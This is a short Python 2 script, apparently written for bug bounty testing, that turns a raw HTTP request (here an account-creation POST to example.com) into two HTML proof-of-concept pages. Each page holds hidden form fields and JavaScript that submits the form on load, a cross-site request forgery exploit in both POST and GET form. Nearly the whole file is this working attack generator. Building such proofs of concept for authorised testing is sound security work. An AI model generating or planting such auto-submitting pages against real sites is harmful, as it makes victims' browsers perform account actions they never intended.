def main():
    try:
        request = '''POST /create_account.php HTTP/1.1
    Host: example.com
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: https://example.com
    Content-Length: 247
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache

    email=email.com&masterpassword=XXXXXXXXX&passwordreminder=ss&timezone=%2B01%3A00%2C0&language=en-US&loglogins=on&improve=on&json=1&website=1&iterations=5000'''

        host = ''
        method = ''
        call = ''
        params = ''
        ty = ''
        index = 0

        for line in request.split('\n'):
            if 'HTTP/' in line:
                method = line.split(' ')[0]
                call = line.split(' ')[1]
            if 'Host' in line:
                host = line.split(' ')[1]
            if 'Referer' in line:
                ty = line.split(' ')[1].split(':')[0]
            if len(line) == 0:
                index += 1
                break
            index += 1

        params = request.split('\n')[index:]

        listOfParams = params[0].split('&')

        folder = 'C:\BugBounty'

        f = open(folder + '\POC_POST.html', 'w+')
        f.write('<html>\n')
        f.write('<body>\n')
        f.write('\n')
        f.write('<form action="' + ty + '://' + host + call + '" method="' + method + '" >\n')
        for item in listOfParams:
            f.write('<input type="hidden" name="' + item.split('=')[0] + '" value="' + item.split('=')[1] + '" />\n')
        f.write('</form>\n')
        f.write('\n')
        f.write('<script language="javascript"> \n')
        f.write('document.forms[0].submit();\n')
        f.write('</script>\n')
        f.write('\n')
        f.write('</body>\n')
        f.write('</html>\n')


        ff = open(folder + '\POC_GET.html', 'w+')
        ff.write('<html>\n')
        ff.write('<body>\n')
        ff.write('\n')
        ff.write('<form action="' + ty + '://' + host + call + '" >\n')
        for item in listOfParams:
                ff.write('<input type="hidden" name="' + item.split('=')[0] + '" value="' + item.split('=')[1] + '" />\n')
        ff.write('</form>\n')
        ff.write('\n')
        ff.write('<script language="javascript"> \n')
        ff.write('document.forms[0].submit();\n')
        ff.write('</script>\n')
        ff.write('\n')
        ff.write('</body>\n')
        ff.write('</html>\n')
        print 'POC Created for GET and POST request on folder %s' % folder
    except:
        print 'Some error happened! POC not created!'

if __name__ == "__main__":
    main()